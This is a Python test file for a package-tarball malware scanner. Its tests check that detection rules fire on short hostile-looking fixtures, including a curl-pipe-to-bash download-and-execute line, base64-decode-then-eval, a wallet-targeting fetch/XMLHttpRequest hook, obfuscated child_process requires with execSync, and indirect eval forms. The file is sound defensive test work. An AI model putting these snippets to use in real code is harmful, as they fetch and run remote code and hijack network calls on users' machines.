from __future__ import annotations

from whotouchedmytarball.models import Severity
from whotouchedmytarball.signals import combo_signal, scan_lines


def rules(path, text):
    return {s.rule for s in scan_lines(path, list(enumerate(text.splitlines(), start=1)))}


def test_benign_code_has_no_signals():
    assert rules("index.js", "function add(a, b) { return a + b; }\nmodule.exports = { add };") == set()


def test_debug_chalk_style_payload_is_detected():
    payload = ("if (typeof window !== 'undefined' && window.ethereum) { window.fetch = hook; "
               "XMLHttpRequest.prototype.send = spy; }")
    found = rules("index.js", payload)
    assert {"hook-network-api", "crypto-wallet"} <= found


def test_decode_and_execute_combo_is_critical():
    text = "const p = Buffer.from(blob, 'base64').toString();\neval(p);"
    signals = scan_lines("index.js", list(enumerate(text.splitlines(), start=1)))
    combo = combo_signal(signals)
    assert combo is not None and combo.severity == Severity.CRITICAL


def test_explained_signals_do_not_trigger_combo():
    text = "const p = atob(blob);\neval(p);"
    signals = scan_lines("index.js", list(enumerate(text.splitlines(), start=1)))
    for s in signals:
        s.explained_by = "source"
    assert combo_signal(signals) is None


def test_regex_exec_method_is_not_eval():
    assert "dynamic-eval" not in rules("index.js", "const m = /a(b)/.exec(input);")


def test_python_payloads():
    found = rules("setup.py", "import subprocess\nsubprocess.Popen(['sh'])\n__import__('base64').b64decode(x)")
    assert {"py-subprocess", "py-dunder-import", "base64-decode"} <= found


def test_shell_download_and_execute():
    assert "shell-download-exec" in rules("install.sh", "curl -s https://example.invalid/x.sh | bash")


def test_documentation_is_not_scanned():
    assert rules("README.md", "Run `curl https://x | sh` to install. eval( is bad") == set()


def test_javascript_obfuscator_identifiers():
    assert "js-obfuscator" in rules("dist/index.js", "var _0x3f2a=['x'];function _0x1b2c(){}")


def test_evasive_eval_and_module_loading_is_detected():
    assert "indirect-eval" in rules("index.js", "globalThis.eval(code);")
    assert "indirect-eval" in rules("index.js", "(0, eval)(code);")
    assert "indirect-eval" in rules("index.js", "window['eval'](code);")
    assert "js-vm" in rules("index.js", "require('node:vm').runInThisContext(code);")
    assert "js-process-binding" in rules("index.js", "process.binding('spawn_sync').spawn(opts);")
    assert "obfuscated-require" in rules("index.js", "const cp = require('child' + '_process');")
    assert "obfuscated-require" in rules("index.js", "const cp = require(['child', 'process'].join('_'));")
    assert "obfuscated-require" in rules("index.js", "process.mainModule.require('child_process');")


def test_hidden_require_plus_execution_is_critical():
    text = "const cp = require('child' + '_process');\ncp.execSync('id');"
    signals = scan_lines("index.js", list(enumerate(text.splitlines(), start=1)))
    assert combo_signal(signals) is not None


def test_ordinary_code_does_not_trip_new_rules():
    benign = ("model.eval();\nself.eval_mode = True\nconst vm = this;\nvm.$emit('done');\n"
              "const mod = require(path.join(dir, name));\nrequire('./' + name);\n")
    assert rules("index.js", benign) & {"indirect-eval", "js-vm", "obfuscated-require"} == set()
